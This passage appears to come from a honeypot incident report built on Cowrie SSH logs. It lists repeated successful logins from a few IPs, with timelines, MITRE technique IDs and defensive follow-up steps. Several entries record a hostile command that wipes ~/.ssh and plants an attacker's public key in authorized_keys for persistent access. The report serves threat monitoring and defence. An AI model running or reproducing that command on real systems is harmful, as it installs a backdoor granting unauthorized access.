| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:09:43` | `cowrie.session.connect` |
| `2026-04-22 07:09:43` | `cowrie.client.version` |
| `2026-04-22 07:09:44` | `cowrie.client.kex` |
| `2026-04-22 07:09:45` | `cowrie.login.success` |
| `2026-04-22 07:09:46` | `cowrie.session.params` |
| `2026-04-22 07:09:46` | `cowrie.command.input` |
| `2026-04-22 07:09:46` | `cowrie.command.failed` |
| `2026-04-22 07:09:46` | `cowrie.log.closed` |
| `2026-04-22 07:09:47` | `cowrie.session.params` |
| `2026-04-22 07:09:47` | `cowrie.command.input` |
| `2026-04-22 07:09:48` | `cowrie.session.file_download` |
| `2026-04-22 07:09:48` | `cowrie.log.closed` |
| `2026-04-22 07:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a3dd554b8f

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:09 |
| **Last Seen** | 2026-04-22 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:09:52` | `cowrie.session.connect` |
| `2026-04-22 07:09:52` | `cowrie.client.version` |
| `2026-04-22 07:09:52` | `cowrie.client.kex` |
| `2026-04-22 07:09:53` | `cowrie.login.success` |
| `2026-04-22 07:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89adf62702af

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:22 |
| **Last Seen** | 2026-04-22 07:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:22:52` | `cowrie.session.connect` |
| `2026-04-22 07:22:52` | `cowrie.client.version` |
| `2026-04-22 07:22:53` | `cowrie.client.kex` |
| `2026-04-22 07:22:54` | `cowrie.login.success` |
| `2026-04-22 07:22:55` | `cowrie.session.params` |
| `2026-04-22 07:22:55` | `cowrie.command.input` |
| `2026-04-22 07:22:55` | `cowrie.command.failed` |
| `2026-04-22 07:22:55` | `cowrie.log.closed` |
| `2026-04-22 07:22:56` | `cowrie.session.params` |
| `2026-04-22 07:22:56` | `cowrie.command.input` |
| `2026-04-22 07:22:57` | `cowrie.session.file_download` |
| `2026-04-22 07:22:57` | `cowrie.log.closed` |
| `2026-04-22 07:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a5c6cc413b

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:23 |
| **Last Seen** | 2026-04-22 07:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:23:01` | `cowrie.session.connect` |
| `2026-04-22 07:23:01` | `cowrie.client.version` |
| `2026-04-22 07:23:01` | `cowrie.client.kex` |
| `2026-04-22 07:23:03` | `cowrie.login.success` |
| `2026-04-22 07:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cefdb6e6e119

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:31 |
| **Last Seen** | 2026-04-22 07:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:31:37` | `cowrie.session.connect` |
| `2026-04-22 07:31:37` | `cowrie.client.version` |
| `2026-04-22 07:31:38` | `cowrie.client.kex` |
| `2026-04-22 07:31:39` | `cowrie.login.success` |
| `2026-04-22 07:31:40` | `cowrie.session.params` |
| `2026-04-22 07:31:40` | `cowrie.command.input` |
| `2026-04-22 07:31:40` | `cowrie.command.failed` |
| `2026-04-22 07:31:40` | `cowrie.log.closed` |
| `2026-04-22 07:31:41` | `cowrie.session.params` |
| `2026-04-22 07:31:41` | `cowrie.command.input` |
| `2026-04-22 07:31:41` | `cowrie.session.file_download` |
| `2026-04-22 07:31:41` | `cowrie.log.closed` |
| `2026-04-22 07:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d9fe6a569f

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:31 |
| **Last Seen** | 2026-04-22 07:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:31:45` | `cowrie.session.connect` |
| `2026-04-22 07:31:45` | `cowrie.client.version` |
| `2026-04-22 07:31:46` | `cowrie.client.kex` |
| `2026-04-22 07:31:47` | `cowrie.login.success` |
| `2026-04-22 07:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7159afb8e941

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:40 |
| **Last Seen** | 2026-04-22 07:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:40:29` | `cowrie.session.connect` |
| `2026-04-22 07:40:29` | `cowrie.client.version` |
| `2026-04-22 07:40:29` | `cowrie.client.kex` |
| `2026-04-22 07:40:31` | `cowrie.login.success` |
| `2026-04-22 07:40:32` | `cowrie.session.params` |
| `2026-04-22 07:40:32` | `cowrie.command.input` |
| `2026-04-22 07:40:32` | `cowrie.command.failed` |
| `2026-04-22 07:40:32` | `cowrie.log.closed` |
| `2026-04-22 07:40:33` | `cowrie.session.params` |
| `2026-04-22 07:40:33` | `cowrie.command.input` |
| `2026-04-22 07:40:33` | `cowrie.session.file_download` |
| `2026-04-22 07:40:33` | `cowrie.log.closed` |
| `2026-04-22 07:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-851fb79c6e68

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:40 |
| **Last Seen** | 2026-04-22 07:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:40:37` | `cowrie.session.connect` |
| `2026-04-22 07:40:37` | `cowrie.client.version` |
| `2026-04-22 07:40:38` | `cowrie.client.kex` |
| `2026-04-22 07:40:39` | `cowrie.login.success` |
| `2026-04-22 07:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fbb39c8285

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:44 |
| **Last Seen** | 2026-04-22 07:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:44:52` | `cowrie.session.connect` |
| `2026-04-22 07:44:52` | `cowrie.client.version` |
| `2026-04-22 07:44:52` | `cowrie.client.kex` |
| `2026-04-22 07:44:54` | `cowrie.login.success` |
| `2026-04-22 07:44:54` | `cowrie.session.params` |
| `2026-04-22 07:44:54` | `cowrie.command.input` |
| `2026-04-22 07:44:54` | `cowrie.command.failed` |
| `2026-04-22 07:44:55` | `cowrie.log.closed` |
| `2026-04-22 07:44:56` | `cowrie.session.params` |
| `2026-04-22 07:44:56` | `cowrie.command.input` |
| `2026-04-22 07:44:56` | `cowrie.session.file_download` |
| `2026-04-22 07:44:56` | `cowrie.log.closed` |
| `2026-04-22 07:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd77cec732c

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:45 |
| **Last Seen** | 2026-04-22 07:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:45:00` | `cowrie.session.connect` |
| `2026-04-22 07:45:00` | `cowrie.client.version` |
| `2026-04-22 07:45:01` | `cowrie.client.kex` |
| `2026-04-22 07:45:03` | `cowrie.login.success` |
| `2026-04-22 07:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b23aba97aa36

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:52 |
| **Last Seen** | 2026-04-22 07:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:52:54` | `cowrie.session.connect` |
| `2026-04-22 07:52:54` | `cowrie.client.version` |
| `2026-04-22 07:52:54` | `cowrie.client.kex` |
| `2026-04-22 07:52:56` | `cowrie.login.success` |
| `2026-04-22 07:52:57` | `cowrie.session.params` |
| `2026-04-22 07:52:57` | `cowrie.command.input` |
| `2026-04-22 07:52:57` | `cowrie.command.failed` |
| `2026-04-22 07:52:57` | `cowrie.log.closed` |
| `2026-04-22 07:52:58` | `cowrie.session.params` |
| `2026-04-22 07:52:58` | `cowrie.command.input` |
| `2026-04-22 07:52:58` | `cowrie.session.file_download` |
| `2026-04-22 07:52:58` | `cowrie.log.closed` |
| `2026-04-22 07:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dcf8dc2e461

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:53 |
| **Last Seen** | 2026-04-22 07:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 07:53:03` | `cowrie.session.connect` |
| `2026-04-22 07:53:03` | `cowrie.client.version` |
| `2026-04-22 07:53:04` | `cowrie.client.kex` |
| `2026-04-22 07:53:05` | `cowrie.login.success` |
| `2026-04-22 07:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85f75934335

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 08:05 |
| **Last Seen** | 2026-04-22 08:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:05:25` | `cowrie.session.connect` |
| `2026-04-22 08:05:25` | `cowrie.client.version` |
| `2026-04-22 08:05:25` | `cowrie.client.kex` |
| `2026-04-22 08:05:27` | `cowrie.login.success` |
| `2026-04-22 08:05:27` | `cowrie.session.params` |
| `2026-04-22 08:05:27` | `cowrie.command.input` |
| `2026-04-22 08:05:27` | `cowrie.command.failed` |
| `2026-04-22 08:05:28` | `cowrie.log.closed` |
| `2026-04-22 08:05:28` | `cowrie.session.params` |
| `2026-04-22 08:05:28` | `cowrie.command.input` |
| `2026-04-22 08:05:29` | `cowrie.session.file_download` |
| `2026-04-22 08:05:29` | `cowrie.log.closed` |
| `2026-04-22 08:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-262864bef037

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 08:05 |
| **Last Seen** | 2026-04-22 08:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:05:33` | `cowrie.session.connect` |
| `2026-04-22 08:05:33` | `cowrie.client.version` |
| `2026-04-22 08:05:33` | `cowrie.client.kex` |
| `2026-04-22 08:05:35` | `cowrie.login.success` |
| `2026-04-22 08:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33162b623ffa

| Field | Detail |
|---|---|
| **Source IP** | `171.83.22[.]91` |
| **First Seen** | 2026-04-22 08:42 |
| **Last Seen** | 2026-04-22 08:42 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:42:30` | `cowrie.session.connect` |
| `2026-04-22 08:42:30` | `cowrie.client.version` |
| `2026-04-22 08:42:31` | `cowrie.client.kex` |
| `2026-04-22 08:42:31` | `cowrie.login.success` |
| `2026-04-22 08:42:32` | `cowrie.session.params` |
| `2026-04-22 08:42:32` | `cowrie.command.input` |
| `2026-04-22 08:42:32` | `cowrie.command.failed` |
| `2026-04-22 08:42:32` | `cowrie.log.closed` |
| `2026-04-22 08:42:35` | `cowrie.session.params` |
| `2026-04-22 08:42:35` | `cowrie.command.input` |
| `2026-04-22 08:42:35` | `cowrie.session.file_download` |
| `2026-04-22 08:42:35` | `cowrie.log.closed` |
| `2026-04-22 08:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.83.22[.]91` to AbuseIPDB if not already reported
- [ ] Block `171.83.22[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac05d5dd3b7

| Field | Detail |
|---|---|
| **Source IP** | `171.83.22[.]91` |
| **First Seen** | 2026-04-22 08:42 |
| **Last Seen** | 2026-04-22 08:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:42:39` | `cowrie.session.connect` |
| `2026-04-22 08:42:39` | `cowrie.client.version` |
| `2026-04-22 08:42:40` | `cowrie.client.kex` |
| `2026-04-22 08:42:51` | `cowrie.login.success` |
| `2026-04-22 08:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.83.22[.]91` to AbuseIPDB if not already reported
- [ ] Block `171.83.22[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6633e0aa6081

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 08:48 |
| **Last Seen** | 2026-04-22 08:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:48:59` | `cowrie.session.connect` |
| `2026-04-22 08:48:59` | `cowrie.client.version` |
| `2026-04-22 08:48:59` | `cowrie.client.kex` |
| `2026-04-22 08:49:00` | `cowrie.login.success` |
| `2026-04-22 08:49:00` | `cowrie.session.params` |
| `2026-04-22 08:49:00` | `cowrie.command.input` |
